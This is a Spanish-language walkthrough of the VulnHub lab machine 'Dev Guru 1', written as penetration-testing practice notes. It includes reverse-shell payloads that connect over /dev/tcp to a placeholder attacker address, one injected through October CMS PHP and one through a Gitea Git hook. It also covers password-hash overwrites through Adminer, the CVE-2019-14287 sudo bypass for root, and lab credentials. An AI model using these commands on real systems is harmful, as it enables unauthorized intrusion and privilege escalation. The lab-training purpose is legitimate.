---
tags:
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/devguru1
dificultad: Media
os: Linux
linked:
  - "[[githack]]"
  - "[[gitea]]"
  - "[[sudo]]"
---
# VulnHub - Dev Guru 1

##  Reconocimiento

### Escaneo con Nmap
```bash
nmap -p- -Pn -oN nmapFullTCP.txt 1 <IP-VICTIMA>
```
**Puertos abiertos**:  
- **22/tcp**: OpenSSH 7.6p1  
- **80/tcp**: Apache 2.4.29 (HTTP)  
- **8585/tcp**: Gitea (HTTP)  

### Enumeración Web (Puerto 80)
- **Página principal**: Sitio corporativo con October CMS.  
- **Fuzzing de directorios** (Dirsearch):  
  - Directorio `.git` expuesto.  
  - `adminer.php` (login de base de datos).  
  - `/backend` (login de October CMS).  


---

## Análisis de vulnerabilidades

**Hallazgo clave**: No se puede ver lo de git, pero usando la herramienta [[githack]] se logra descargarse igual.

- Uso **GitHack** para clonar el repositorio expuesto:
  ```bash
  python3 GitHack.py http://devguru.local/.git/
  ```
- Encuentro credenciales en `config/database.php`:
  ```php
  'username' => 'october', 
  'password' => 'SQ66EBYx4GT3byXH'
  ```

### Enumeración Web (Puerto 8585)
- **Gitea 1.12.5** (no permite registro público).  
- Fuzzing revela `/user/login` y `/explore/repos`.


---

## Explotación de vulnerabilidades

### Acceso Inicial

1. **Obtención de Credenciales**:  
   - Accedo a `adminer.php` con `october:SQ66EBYx4GT3byXH`.  
   - Modifico el hash de contraseña de `frank` en `backend_users` usando bcrypt (Ejemplo: `aaaa:$2a$12$Tnt5wfqfRxGTTM7/R2daZOLvc6r11egOzesJwRyoqDb6lT6LfcWry`).

2. **Ejecución de Código en October CMS**:  
   - Inicio sesión en `/backend` como `frank:aaaa`.  
   - Inyecto código PHP en una página del CMS para obtener una reverse shell:
     ```php
     function onStart() { 
         system('bash -c "bash -i &> /dev/tcp/TU_IP/PUERTO 0>&1"'); 
     }
     ```
   - Ejecuto el payload visitando `/shell` para ganar acceso como `www-data`.


---

## Escalada de privilegios

### Escalada a Frank

1. **Análisis con LinPEAS**:  
   - Descubre `/var/backups/app.ini.bak` con credenciales de Gitea:
     ```
     USER = gitea
     PASSWD = UfFPTF8C8jjxVF2m
     ```

2. **Explotación de Gitea**:  
   - Modifico el hash de `frank` en la base de datos de Gitea vía `adminer.php`.  
   - Abuso de **RCE Autenticado** usando hooks de Git:  
     - En Configuración del Repositorio > Git Hooks (Pre-Receive).  
     - Inyecto el payload de reverse shell:
       ```bash
       bash -c "bash -i &> /dev/tcp/TU_IP/PUERTO 0>&1"
       ```
     - Fuerzo un `commit` para activar el shell como `frank`.

---

### Escalada a Root

1. **Configuración Incorrecta de Sudo**:  
   ```bash
   sudo -l
   # Output: (ALL, !root) NOPASSWD: /usr/bin/sqlite3
   ```

2. **Explotación de CVE-2019-14287**:  
   - Bypasseamos la restricción con `-u#-1` para ejecutar como root:
     ```bash
     sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/sh'
     ```
   - Obtengo acceso como root.


---

## Bandera(s)

> [!flag] `flag{user}`
> 22854d0aec6ba776f9d35bf7b0e00217
^bandera-user

> [!flag] `flag{root}`
> 96440606fb88aa7497cde5a8e68daf8f
^bandera-root
